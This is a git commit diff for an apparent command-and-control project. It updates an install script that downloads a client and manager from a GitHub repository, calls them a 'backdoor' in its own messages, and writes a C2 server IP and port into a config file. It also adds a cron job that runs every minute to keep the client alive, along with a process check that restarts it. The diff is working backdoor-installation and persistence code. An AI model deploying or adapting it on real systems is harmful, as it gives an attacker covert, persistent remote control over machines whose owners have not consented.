14e35d9970231e6a0f3ca91789119c1396b94e33
Anton Forsman <10177340+anforsm@users.noreply.github.com>
2023-10-08 22:54:28 -0500

    update install and manager scripts

--- install.sh
+++ install.sh
@@ -1,5 +1,16 @@
 #!/bin/bash
-yum install -y python3
-curl https://raw.githubusercontent.com/anforsm/command_and_control/main/client.py > /home/user/client.py
-curl https://raw.githubusercontent.com/anforsm/command_and_control/main/manager.sh > /home/user/manager.sh
+echo "Installing dependencies..."
+echo "Installing python3"
+yum install -y -q python3
+echo "Downloading backdoor..."
+curl -s https://raw.githubusercontent.com/anforsm/command_and_control/main/client.py > /home/user/client.py
+curl -s https://raw.githubusercontent.com/anforsm/command_and_control/main/manager.sh > /home/user/manager.sh
+echo "Configure backdoor"
+read -p "Enter server ip: " server_ip
+read -p "Enter server port: " server_port
+rm -f /home/user/conf.py
+echo "SERVER_IP = '$server_ip'\n" >> /home/user/conf.py
+echo "SERVER_PORT = $server_port\n" >> /home/user/conf.py
+chmod +x /home/user/manager.sh
 (crontab -l 2>/dev/null; echo "* * * * * /home/user/manager.sh") | crontab -
+echo "Installation complete"
--- manager.sh
+++ manager.sh
@@ -1,5 +1,5 @@
 # check if the script is running, if not, run it
-ps aux | grep "python3 client.py"
+ps aux | grep "python3 [c]lient.py"
 if [ $? -ne 0 ]; then
     cd /home/user/c_and_c/
     python3 client.py
